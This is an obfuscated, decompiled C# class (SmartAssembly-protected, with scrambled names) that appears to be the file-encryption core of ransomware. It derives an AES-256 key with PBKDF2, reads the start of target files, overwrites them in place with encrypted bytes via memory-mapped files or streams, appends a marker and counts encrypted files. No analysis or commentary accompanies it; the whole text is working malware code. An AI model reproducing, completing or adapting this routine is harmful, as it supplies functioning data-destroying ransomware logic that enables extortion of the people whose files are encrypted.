using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace maXgRZLUwUwi;

public static class stgsEAeFeTEw
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] lnSkBnMZylaQj(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = ZvhLkJoqlWcbm(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes ZvhLkJoqlWcbm(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] aSuXlLtwWpA(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (dVGeYGcQgLS.hEPyWDyzsMB == getString_0(107396978))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (dVGeYGcQgLS.IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(dVGeYGcQgLS.AJkkstCArH, getString_0(107390790) + string_0 + getString_0(107405502) + ex.Message + getString_0(107396292));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void HkuHIkbrpjRy(string tevOmFuhLjKBF, byte[] zVTmHFmLlT, byte[] wAHvXFtGoVAD = null)
	{
		try
		{
			byte[] array = null;
			if (dVGeYGcQgLS.hEPyWDyzsMB == getString_0(107396978))
			{
				array = (dVGeYGcQgLS.lPNPDgvBRE ? Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956))) : Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(tevOmFuhLjKBF, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(zVTmHFmLlT, 0, zVTmHFmLlT.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(tevOmFuhLjKBF, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!dVGeYGcQgLS.lPNPDgvBRE)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(wAHvXFtGoVAD, 0, wAHvXFtGoVAD.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (dVGeYGcQgLS.lPNPDgvBRE ? Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956))) : Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485))));
				FileStream fileStream2 = new FileStream(tevOmFuhLjKBF, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(zVTmHFmLlT, 0, zVTmHFmLlT.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(tevOmFuhLjKBF, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!dVGeYGcQgLS.lPNPDgvBRE)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(wAHvXFtGoVAD, 0, wAHvXFtGoVAD.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			dVGeYGcQgLS.UOSpFwBdRnM++;
		}
		catch (Exception ex)
		{
			if (dVGeYGcQgLS.IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(dVGeYGcQgLS.AJkkstCArH, getString_0(107390790) + tevOmFuhLjKBF + getString_0(107405947) + ex.Message + getString_0(107396292));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (dVGeYGcQgLS.lPNPDgvBRE ? Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405956))) : Encoding.ASCII.GetBytes(dVGeYGcQgLS.KPabEeiJZVewrU(dVGeYGcQgLS.rLXXesjrDyx) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485)) + Convert.ToString(dVGeYGcQgLS.ddqPQmPoIWuW) + dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107405485))));
			FileStream fileStream4 = new FileStream(tevOmFuhLjKBF, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(zVTmHFmLlT, 0, zVTmHFmLlT.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(tevOmFuhLjKBF, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!dVGeYGcQgLS.lPNPDgvBRE)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(wAHvXFtGoVAD, 0, wAHvXFtGoVAD.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static stgsEAeFeTEw()
	{
		Strings.CreateGetStringDelegate(typeof(stgsEAeFeTEw));
	}
}
